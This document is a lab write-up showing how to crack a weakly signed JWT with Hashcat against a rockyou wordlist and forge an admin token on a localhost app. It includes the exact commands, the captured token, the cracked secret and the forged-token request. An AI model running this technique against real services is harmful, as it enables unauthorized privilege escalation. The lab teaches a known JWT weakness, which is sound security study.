
---

# 📖 High-Level Summary:

This lab demonstrates how to use **Hashcat** to crack a JSON Web Token (JWT) signature and leverage the cracked password to forge a new token with elevated privileges. By modifying the JWT payload and signing it with the cracked password, access to the **admin dashboard** is achieved.

---

# 📚 Definition Bank:

| **Term**                     | **Definition**                                                             | **Key Notes**                                                                   |
| ---------------------------- | -------------------------------------------------------------------------- | ------------------------------------------------------------------------------- |
| **Hashcat**                  | A password recovery tool designed for brute-forcing hashes.                | Supports cracking JWT signatures using `-m 16500`.                              |
| **JWT (JSON Web Token)**     | A token format containing encoded header, payload, and signature sections. | Used for stateless authentication. Can be decoded at [jwt.io](https://jwt.io/). |
| **curl**                     | A command-line tool for transferring data with URLs.                       | Useful for interacting with APIs to send requests and headers.                  |
| **`-a` flag in Hashcat**     | Specifies the attack mode. `-a 0` means dictionary-based attacks.          | Most common mode used with wordlists.                                           |
| **`-m` flag in Hashcat**     | Specifies the hash type to crack. `-m 16500` is used for JWT signatures.   | Identifies the hash algorithm to be cracked.                                    |
| **`--show` flag in Hashcat** | Displays cracked hashes and their corresponding plaintext passwords.       | Used to confirm successful cracks.                                              |

---

# 🎯 Steps and Commands:

### Step 1: Login with Valid Credentials

1. Use `curl` to log in and retrieve a **JWT**:
    
```bash
curl -X POST http://localhost/login --header "Content-Type: application/json" --data '{"username": "user", "password": "user"}'
```
    
2. **Output:**
    
```json
{
"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsIWF0IjoxNjc1NDE2NzE1fQ.3vxLIVEcfPZlugDcq6gXl80R1iPJ37gKuayFHHGrO8k"
}
```


---

### Step 2: Crack the JWT with Hashcat

1. Use Hashcat to crack the signature using a wordlist:
    
    ```bash
hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsIWF0IjoxNjc1NDE2NzE1fQ.3vxLIVEcfPZlugDcq6gXl80R1iPJ37gKuayFHHGrO8k /usr/share/wordlists/rockyou.txt
```

2. **Output:**
    
```
    Status...........: Cracked
    Hash.Mode........: 16500 (JWT (JSON Web Token))
    Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
    Recovered........: 1/1 (100.00%) Digests
```


---

### Step 3: Verify the Cracked Password

1. Use the `--show` flag to confirm the cracked password:
    
```bash
hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsIWF0IjoxNjc1NDE2NzE1fQ.3vxLIVEcfPZlugDcq6gXl80R1iPJ37gKuayFHHGrO8k /usr/share/wordlists/rockyou.txt --show
```

2. **Output:**
    
```
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsIWF0IjoxNjc1NDE2NzE1fQ.3vxLIVEcfPZlugDcq6gXl80R1iPJ37gKuayFHHGrO8k:ucyxu6
```


---

### Step 4: Modify the JWT and Access the Admin Dashboard

1. Decode the token at [jwt.io](https://jwt.io/).
    
2. Modify the payload:
    
```json
    {
      "userid": "admin",
      "iat": 1675347297
    }
```
    
3. Re-sign the token using the cracked password `ucyxu6`.
    
4. Use the modified token to access the admin dashboard:
    
```bash
curl -i http://localhost/dashboard --header 'Authorization: Bearer <modified_token>'
```
    
5. **Output:**
    
```http
    HTTP/1.1 200 OK
    Content-Type: application/json; charset=utf-8
    {
      "message": "Welcome to your dashboard admin"
    }
```


---

# ✅ Key Takeaways:

- **Hashcat**: A powerful tool for cracking JWT signatures when the secret is weak or guessable.
- **JWT Weakness:** If the signing secret is cracked, payload manipulation can grant unauthorized access.
- **curl:** Useful for testing API endpoints with forged tokens for privilege escalation.

---
